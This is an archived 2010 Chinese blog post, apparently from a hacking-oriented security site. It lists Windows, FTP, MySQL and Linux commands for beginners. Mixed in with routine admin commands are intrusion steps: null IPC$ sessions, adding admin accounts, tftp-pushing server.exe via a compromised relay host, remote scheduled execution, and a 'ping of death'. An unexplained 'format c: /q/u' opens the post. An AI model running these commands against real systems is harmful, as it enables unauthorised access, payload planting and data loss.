@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>一些网络DOS命令，希望对新手有用 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="一些网络DOS命令，希望对新手有用。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="一些网络DOS命令，希望对新手有用,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/168/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="一些网络DOS命令，希望对新手有用" />
+<meta property="og:description" content="一些网络DOS命令，希望对新手有用。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/168/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2010-06-06T12:23:00&#43;08:00" />
+<meta property="article:modified_time" content="2010-06-06T12:23:00&#43;08:00" />
+
+<meta itemprop="name" content="一些网络DOS命令，希望对新手有用">
+<meta itemprop="description" content="一些网络DOS命令，希望对新手有用。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2010-06-06T12:23:00&#43;08:00" />
+<meta itemprop="dateModified" content="2010-06-06T12:23:00&#43;08:00" />
+<meta itemprop="wordCount" content="5901">
+<meta itemprop="keywords" content="Dos,命令,网络,Ascii,Cmd,exe,FTP,IE,IIS,IP,Mysql,Net,Root,SQL,本地,查询,程序,端口,二进制,服务,服务器,管理,局域网,密码,批处理,权限,上传,数据,数据库,锁,文件,文件夹,系统,协议,隐藏,远程,注册表," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="一些网络DOS命令，希望对新手有用"/>
+<meta name="twitter:description" content="一些网络DOS命令，希望对新手有用。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">一些网络DOS命令，希望对新手有用</h1>
+      
+      <div class="post-meta">
+        <time datetime="2010-06-06" class="post-time">
+          2010-06-06
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/dos/"> Dos </a>
+            <a href="https://lcx.cc/categories/%E5%91%BD%E4%BB%A4/"> 命令 </a>
+            <a href="https://lcx.cc/categories/%E7%BD%91%E7%BB%9C/"> 网络 </a>
+            
+          </div>
+        <span class="more-meta"> 约 5901 字 </span>
+          <span class="more-meta"> 预计阅读 12 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>format c: /q/u</P>
+<P>net use <A href="file://\\ip\ipc$">\\ip\ipc$</A> " " /user:" " 建立IPC空链接 </P>
+<P>net use <A href="file://\\ip\ipc$">\\ip\ipc$</A> "密码" /user:"用户名" 建立IPC非空链接 </P>
+<P>net use h: <A href="file://\\ip\c$">\\ip\c$</A> "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: </P>
+<P>net use h: <A href="file://\\ip\c$">\\ip\c$</A> 登陆后映射对方C：到本地为H: </P>
+<P>net use <A href="file://\\ip\ipc$">\\ip\ipc$</A> /del 删除IPC链接 </P>
+<P>net use h: /del 删除映射对方到本地的为H:的映射 </P>
+<P>net user 用户名 密码 /add 建立用户 </P>
+<P>net user guest /active:yes 激活guest用户 </P>
+<P>net user 查看有哪些用户 </P>
+<P>net user 帐户名 查看帐户的属性 </P>
+<P>net localgroup ***istrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：***istrator后加s用复数 </P>
+<P>net start 查看开启了哪些服务 </P>
+<P>net start 服务名 开启服务；(如:net start telnet， net start schedule) </P>
+<P>net stop 服务名 停止某服务 </P>
+<P>net time \\目标ip 查看对方时间 </P>
+<P>net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 </P>
+<P>net view 查看本地局域网内开启了哪些共享 </P>
+<P>net view <A href="file://\\ip">\\ip</A> 查看对方局域网内开启了哪些共享 </P>
+<P>net config 显示系统网络设置 </P>
+<P>net logoff 断开连接的共享 </P>
+<P>net pause 服务名 暂停某服务 </P>
+<P>net send ip "文本信息" 向对方发信息 </P>
+<P>net ver 局域网内正在使用的网络连接类型和信息 </P>
+<P>net share 查看本地开启的共享 </P>
+<P>net share ipc$ 开启ipc$共享 </P>
+<P>net share ipc$ /del 删除ipc$共享 </P>
+<P>net share c$ /del 删除C：共享 </P>
+<P>net user guest 12345 用guest用户登陆后用将密码改为12345 </P>
+<P>net password 密码 更改系统登陆密码 </P>
+<P>netstat -a 查看开启了哪些端口,常用netstat -an </P>
+<P>netstat -n 查看端口的网络连接情况，常用netstat -an </P>
+<P>netstat -v 查看正在进行的工作 </P>
+<P>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） </P>
+<P>netstat -s 查看正在使用的所有协议使用情况 </P>
+<P>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 </P>
+<P>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 </P>
+<P>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 </P>
+<P>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) </P>
+<P>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 </P>
+<P>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) </P>
+<P>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) </P>
+<P>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 </P>
+<P>#2 二： </P>
+<P>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） </P>
+<P>move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 </P>
+<P>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"&gt; "和"&gt; &gt;" 是重定向命令 </P>
+<P>at id号 开启已注册的某个计划任务 </P>
+<P>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 </P>
+<P>at id号 /delete 停止某个已注册的计划任务 </P>
+<P>at 查看所有的计划任务 </P>
+<P>at <A href="file://\\ip">\\ip</A> time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 </P>
+<P>finger username @host 查看最近有哪些用户登陆 </P>
+<P>telnet ip 端口 远和登陆服务器,默认端口为23 </P>
+<P>open ip 连接到IP（属telnet登陆后的命令） </P>
+<P>telnet 在本机上直接键入telnet 将进入本机的telnet </P>
+<P>copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 </P>
+<P>copy c:\srv.exe <A href="file://\\ip\***$">\\ip\***$</A> 复制本地c:\srv.exe到对方的***下 </P>
+<P>copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 </P>
+<P>copy <A href="file://\\ip\***$\svv.exe">\\ip\***$\svv.exe</A> c:\ 或:copy\\ip\***$\*.* 复制对方***i$共享下的srv.exe文件（所有文件）至本地C： </P>
+<P>xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 </P>
+<P>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 </P>
+<P>tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机 </P>
+<P>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) </P>
+<P>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface </P>
+<P>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 </P>
+<P>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 </P>
+<P>mem 查看cpu使用情况 </P>
+<P>attrib 文件名(目录名) 查看某文件（目录）的属性 </P>
+<P>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 </P>
+<P>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 </P>
+<P>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 </P>
+<P>set 指定环境变量名称=要指派给变量的字符 设置环境变量 </P>
+<P>set 显示当前所有的环境变量 </P>
+<P>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 </P>
+<P>pause 暂停批处理程序，并显示出：请按任意键继续.... </P>
+<P>if 在批处理程序中执行条件处理（更多说明见if命令及变量） </P>
+<P>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） </P>
+<P>call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） </P>
+<P>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） </P>
+<P>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 </P>
+<P>echo 信息 在屏幕上显示出信息 </P>
+<P>echo 信息 &gt;&gt; pass.txt 将"信息"保存到pass.txt文件中 </P>
+<P>findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello </P>
+<P>find 文件名 查找某文件 </P>
+<P>title 标题名字 更改CMD窗口标题名字 </P>
+<P>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 </P>
+<P>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ ) </P>
+<P>#3 三： </P>
+<P>ver 在DOS窗口下显示版本信息 </P>
+<P>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） </P>
+<P>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS </P>
+<P>md 目录名 创建目录 </P>
+<P>replace 源文件 要替换文件的目录 替换文件 </P>
+<P>ren 原文件名 新文件名 重命名文件名 </P>
+<P>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 </P>
+<P>type 文件名 显示文本文件的内容 </P>
+<P>more 文件名 逐屏显示输出文件 </P>
+<P>doskey 要锁定的命令＝字符 </P>
+<P>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= </P>
+<P>taskmgr 调出任务管理器 </P>
+<P>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 </P>
+<P>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 </P>
+<P>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe </P>
+<P>path 路径\可执行文件的文件名 为可执行文件设置一个路径。 </P>
+<P>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? </P>
+<P>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； </P>
+<P>regedit /e 注册表文件名 导出注册表 </P>
+<P>cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 </P>
+<P>cacls 文件名 查看文件的访问用户权限列表 </P>
+<P>REM 文本内容 在批处理文件中添加注解 </P>
+<P>netsh 查看或更改本地网络配置情况 </P>
+<P>#4 四： </P>
+<P>IIS服务命令： </P>
+<P>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） </P>
+<P>iisreset /start或stop 启动（停止）所有Internet服务 </P>
+<P>iisreset /restart 停止然后重新启动所有Internet服务 </P>
+<P>iisreset /status 显示所有Internet服务状态 </P>
+<P>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 </P>
+<P>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 </P>
+<P>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 </P>
+<P>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 </P>
+<P>FTP 命令： (后面有详细说明内容) </P>
+<P>ftp的命令行格式为: </P>
+<P>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 </P>
+<P>－d 使用调试方式。 </P>
+<P>－n 限制ftp的自动登录,即不使用.netrc文件。 </P>
+<P>－g 取消全局文件名。 </P>
+<P>help [命令] 或 ？[命令] 查看命令说明 </P>
+<P>bye 或 quit 终止主机FTP进程,并退出FTP管理方式. </P>
+<P>pwd 列出当前远端主机目录 </P>
+<P>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 </P>
+<P>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 </P>
+<P>mget [remote-files] 从远端主机接收一批文件至本地主机 </P>
+<P>mput local-files 将本地主机中一批文件传送至远端主机 </P>
+<P>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 </P>
+<P>ascii 设定以ASCII方式传送文件(缺省值) </P>
+<P>bin 或 image 设定以二进制方式传送文件 </P>
+<P>bell 每完成一次文件传送,报警提示 </P>
+<P>cdup 返回上一级目录 </P>
+<P>close 中断与远程服务器的ftp会话(与open对应) </P>
+<P>open host[port] 建立指定ftp服务器连接,可指定连接端口 </P>
+<P>delete 删除远端主机中的文件 </P>
+<P>mdelete [remote-files] 删除一批文件 </P>
+<P>mkdir directory-name 在远端主机中建立目录 </P>
+<P>rename [from] [to] 改变远端主机中的文件名 </P>
+<P>rmdir directory-name 删除远端主机中的目录 </P>
+<P>status 显示当前FTP的状态 </P>
+<P>system 显示远端主机系统类型 </P>
+<P>user user-name [password] [account] 重新以别的用户名登录远端主机 </P>
+<P>open host [port] 重新建立一个新的连接 </P>
+<P>prompt 交互提示模式 </P>
+<P>macdef 定义宏命令 </P>
+<P>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 </P>
+<P>chmod 改变远端主机的文件权限 </P>
+<P>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 </P>
+<P>cd remote－dir 进入远程主机目录 </P>
+<P>cdup 进入远程主机目录的父目录 </P>
+<P>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip </P>
+<P>#5 五： </P>
+<P>MYSQL 命令： </P>
+<P>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 </P>
+<P>（例：mysql -h110.110.110.110 -Uroot -P123456 </P>
+<P>注:u与root可以不用加空格，其它也一样） </P>
+<P>exit 退出MYSQL </P>
+<P>mysql*** -u用户名 -p旧密码 password 新密码 修改密码 </P>
+<P>grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） </P>
+<P>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 </P>
+<P>use mysql； </P>
+<P>show tables; 显示库中的数据表 </P>
+<P>describe 表名; 显示数据表的结构 </P>
+<P>create database 库名; 建库 </P>
+<P>use 库名； </P>
+<P>create table 表名 (字段设定列表)； 建表 </P>
+<P>drop database 库名; </P>
+<P>drop table 表名； 删库和删表 </P>
+<P>delete from 表名; 将表中记录清空 </P>
+<P>select * from 表名; 显示表中的记录 </P>
+<P>mysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的<A href="file://\\mysql\\bin">\\mysql\\bin</A>目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 </P>
+<P>win2003系统下新增命令（实用部份）： </P>
+<P>shutdown /参数 关闭或重启本地或远程主机。 </P>
+<P>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 </P>
+<P>例：shutdown /r /t 0 立即重启本地主机（无延时） </P>
+<P>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 </P>
+<P>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 </P>
+<P>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 </P>
+<P>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 </P>
+<P>#6 六： </P>
+<P>Linux系统下基本命令： 要区分大小写 </P>
+<P>uname 显示版本信息（同win2K的 ver） </P>
+<P>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） </P>
+<P>pwd 查询当前所在的目录位置 </P>
+<P>cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 </P>
+<P>cat 文件名 查看文件内容 </P>
+<P>cat &gt;abc.txt 往abc.txt文件中写上内容。 </P>
+<P>more 文件名 以一页一页的方式显示一个文本文件。 </P>
+<P>cp 复制文件 </P>
+<P>mv 移动文件 </P>
+<P>rm 文件名 删除文件，rm -a 目录名删除目录及子目录 </P>
+<P>mkdir 目录名 建立目录 </P>
+<P>rmdir 删除子目录，目录内没有文档。 </P>
+<P>chmod 设定档案或目录的存取权限 </P>
+<P>grep 在档案中查找字符串 </P>
+<P>diff 档案文件比较 </P>
+<P>find 档案搜寻 </P>
+<P>date 现在的日期、时间 </P>
+<P>who 查询目前和你使用同一台机器的人以及Login时间地点 </P>
+<P>w 查询目前上机者的详细资料 </P>
+<P>whoami 查看自己的帐号名称 </P>
+<P>groups 查看某人的Group </P>
+<P>passwd 更改密码 </P>
+<P>history 查看自己下过的命令 </P>
+<P>ps 显示进程状态 </P>
+<P>kill 停止某进程 </P>
+<P>gcc 黑客通常用它来编译C语言写的文件 </P>
+<P>su 权限转换为指定使用者 </P>
+<P>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 </P>
+<P>ftp ftp连接上某服务器（同win2K）</P>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2010-06-06
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/dos/">Dos</a>
+          <a href="https://lcx.cc/tags/%E5%91%BD%E4%BB%A4/">命令</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C/">网络</a>
+          <a href="https://lcx.cc/tags/ascii/">Ascii</a>
+          <a href="https://lcx.cc/tags/cmd/">Cmd</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/ftp/">FTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/iis/">IIS</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/mysql/">Mysql</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/root/">Root</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/%E6%9C%AC%E5%9C%B0/">本地</a>
+          <a href="https://lcx.cc/tags/%E6%9F%A5%E8%AF%A2/">查询</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E7%AB%AF%E5%8F%A3/">端口</a>
+          <a href="https://lcx.cc/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+          <a href="https://lcx.cc/tags/%E7%AE%A1%E7%90%86/">管理</a>
+          <a href="https://lcx.cc/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/">局域网</a>
+          <a href="https://lcx.cc/tags/%E5%AF%86%E7%A0%81/">密码</a>
+          <a href="https://lcx.cc/tags/%E6%89%B9%E5%A4%84%E7%90%86/">批处理</a>
+          <a href="https://lcx.cc/tags/%E6%9D%83%E9%99%90/">权限</a>
+          <a href="https://lcx.cc/tags/%E4%B8%8A%E4%BC%A0/">上传</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          <a href="https://lcx.cc/tags/%E9%94%81/">锁</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6%E5%A4%B9/">文件夹</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E5%8D%8F%E8%AE%AE/">协议</a>
+          <a href="https://lcx.cc/tags/%E9%9A%90%E8%97%8F/">隐藏</a>
+          <a href="https://lcx.cc/tags/%E8%BF%9C%E7%A8%8B/">远程</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/">注册表</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/169/">
+            
+            <i class="iconfont">
